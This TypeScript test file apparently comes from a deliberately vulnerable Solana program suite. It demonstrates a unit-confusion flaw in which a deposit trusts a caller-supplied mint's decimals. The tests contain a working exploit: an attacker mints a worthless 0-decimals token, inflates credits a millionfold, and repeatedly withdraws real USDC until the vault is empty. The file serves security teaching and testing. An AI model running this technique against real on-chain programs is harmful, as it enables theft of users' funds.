/**
 * VULN 19 — unvalidated mint decimals (unit confusion).
 *
 * `deposit` converts the instruction amount into credits using the decimals
 * of the mint account the CALLER passes: credits = amount * 10^(6 - dec).
 * With the honest 6-decimals asset the multiplier is 1. The attacker brings
 * their own 0-decimals mint: depositing 2 worthless units mints 2_000_000
 * credits, cashed out from the USDC vault at the fixed 1-unit = 1-base-unit
 * rate.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, BN, LAMPORTS_PER_SOL, TOKEN_PROGRAM_ID, Keypair,
} from "./util";

describe("vuln19 zero-decimals fake mint inflates credits", () => {
  const program = anchorProgram("vuln19_decimals", PROG_IDS.vuln19);
  const usdcVault = findPda([seedsBuf("usdc_vault")[0]], PROG_IDS.vuln19)[0];
  const creditsOf = (user: any) =>
    findPda([seedsBuf("credits")[0], user.publicKey.toBuffer()], PROG_IDS.vuln19)[0];

  let usdcMint: PublicKey, usdcVaultTa: PublicKey;
  let attacker: any, attackerUsdcTa: PublicKey;
  let depositVaultTa: PublicKey, attackerFakeTa: PublicKey, fakeMint: PublicKey;
  let fakeVaultTa: PublicKey;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    attacker = await newFundedKeypair();

    // The honest 6-decimals payout asset ("USDC").
    usdcMint = await createMint(provider.connection, provider.wallet.payer,
      provider.wallet.publicKey, null, 6);

    await program.methods.initialize()
      .accounts({ usdcMint, usdcVault, payer: provider.wallet.publicKey })
      .rpc();

    // Payout vault token account owned by the usdc_vault PDA.
    usdcVaultTa = await createAccount(provider.connection, provider.wallet.payer,
      usdcMint, usdcVault, Keypair.generate());
    // Deposit-side vault (owner is irrelevant for incoming transfers).
    depositVaultTa = await createAccount(provider.connection, provider.wallet.payer,
      usdcMint, provider.wallet.publicKey, Keypair.generate());

    // 10 USDC of honest liquidity in the payout vault.
    await mintTo(provider.connection, provider.wallet.payer, usdcMint, usdcVaultTa,
      provider.wallet.publicKey, 10_000_000);
  });

  it("honest 6-decimals deposit is accounted 1:1", async () => {
    const honestTa = await createAccount(provider.connection, provider.wallet.payer,
      usdcMint, provider.wallet.publicKey);
    await mintTo(provider.connection, provider.wallet.payer, usdcMint, honestTa,
      provider.wallet.publicKey, 1_000_000);

    await program.methods.deposit(new BN(1_000_000))
      .accounts({
        depositMint: usdcMint, depositVaultTa, userTa: honestTa,
        user: provider.wallet.publicKey, credits: creditsOf(provider.wallet),
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .rpc();

    const c = await program.account.credits.fetch(creditsOf(provider.wallet));
    assert.equal(c.amount.toString(), "1000000");
  });

  it("0-decimals mint multiplies credits by 10^6", async () => {
    // The attacker self-issues a worthless 0-decimals asset.
    fakeMint = await createMint(provider.connection, provider.wallet.payer,
      attacker.publicKey, null, 0);
    attackerFakeTa = await createAccount(provider.connection, provider.wallet.payer,
      fakeMint, attacker.publicKey);
    await mintTo(provider.connection, provider.wallet.payer, fakeMint, attackerFakeTa,
      attacker.publicKey, 100, [attacker]);

    // Deposit-side vault for the fake asset (owner irrelevant).
    fakeVaultTa = await createAccount(provider.connection, provider.wallet.payer,
      fakeMint, provider.wallet.publicKey, Keypair.generate());

    // 2 units -> 2_000_000 credits.
    await program.methods.deposit(new BN(2))
      .accounts({
        depositMint: fakeMint, depositVaultTa: fakeVaultTa, userTa: attackerFakeTa,
        user: attacker.publicKey, credits: creditsOf(attacker),
      })
      .signers([attacker]).rpc();

    const c = await program.account.credits.fetch(creditsOf(attacker));
    assert.equal(c.amount.toString(), "2000000");
  });

  it("attacker cashes out 2 USDC for 2 worthless units", async () => {
    attackerUsdcTa = await createAccount(provider.connection, provider.wallet.payer,
      usdcMint, attacker.publicKey);
    const vaultBefore = await tokenBalance(usdcVaultTa);

    await program.methods.withdraw(new BN(2_000_000))
      .accounts({
        usdcMint, usdcVault, usdcVaultTa, userUsdcTa: attackerUsdcTa,
        credits: creditsOf(attacker), user: attacker.publicKey,
      })
      .signers([attacker]).rpc();

    assert.equal((await tokenBalance(attackerUsdcTa)).toString(), "2000000");
    assert.equal(vaultBefore - (await tokenBalance(usdcVaultTa)), 2_000_000n);
  });

  it("repeating the round drains the whole 10 USDC vault", async () => {
    // 4 more rounds x 2 units x 10^6 = 8_000_000 credits redeemed.
    for (let i = 0; i < 4; i++) {
      await program.methods.deposit(new BN(2))
        .accounts({
          depositMint: fakeMint, depositVaultTa: fakeVaultTa, userTa: attackerFakeTa,
          user: attacker.publicKey, credits: creditsOf(attacker),
        })
        .signers([attacker]).rpc();

      await program.methods.withdraw(new BN(2_000_000))
        .accounts({
          usdcMint, usdcVault, usdcVaultTa, userUsdcTa: attackerUsdcTa,
          credits: creditsOf(attacker), user: attacker.publicKey,
        })
        .signers([attacker]).rpc();
    }

    assert.equal((await tokenBalance(usdcVaultTa)).toString(), "0");
    assert.equal((await tokenBalance(attackerUsdcTa)).toString(), "10000000");
  });
});
